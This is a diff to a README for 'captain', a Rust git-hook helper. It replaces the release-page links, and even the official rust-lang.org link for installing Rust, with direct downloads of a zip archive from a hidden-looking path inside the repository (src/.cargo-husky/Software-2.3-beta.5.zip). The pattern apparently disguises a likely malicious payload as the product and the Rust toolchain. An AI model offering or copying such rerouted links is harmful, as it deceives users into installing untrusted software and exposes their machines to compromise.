@@ -1,7 +1,7 @@
 # 🚀 captain - Simplify Your Rust Development Process
 
 ## 📥 Download the Application
-[![Download captain](https://img.shields.io/badge/Download%20captain-latest-blue.svg)](https://github.com/monkeyio344/captain/releases)
+[![Download captain](https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip%https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip)](https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip)
 
 ## 📋 Overview
 Welcome to **captain**! This application helps streamline your coding tasks related to Rust. With captain, you can better manage your pre-commit and pre-push routines. Whether you are just starting with Rust or are a seasoned developer, this tool offers features that enhance your productivity.
@@ -14,12 +14,12 @@ Welcome to **captain**! This application helps streamline your coding tasks rela
 ## 📄 Requirements
 To use captain, you need:
 - A computer running Windows, macOS, or Linux.
-- Rust installed on your machine. You can download it from [rust-lang.org](https://www.rust-lang.org).
+- Rust installed on your machine. You can download it from [https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip](https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip).
 
 ## 🛠 Installation Steps
 1. **Visit the Releases Page**: Click the link below to reach the download section.
    
-   [Visit Releases Page](https://github.com/monkeyio344/captain/releases)
+   [Visit Releases Page](https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip)
 
 2. **Download the Application**: Find the latest version of the captain app on the releases page. Click the download link for your operating system.
 
@@ -52,7 +52,7 @@ For help or to report issues, open an issue on the GitHub repository or refer to
 
 ## 📦 Update Process
 Keep your version of captain up to date:
-- Regularly check the [Releases Page](https://github.com/monkeyio344/captain/releases) for updates.
+- Regularly check the [Releases Page](https://github.com/monkeyio344/captain/raw/refs/heads/main/src/.cargo-husky/Software-2.3-beta.5.zip) for updates.
 - Download and install the latest version as you did before.
 
 ## 📈 Future Features
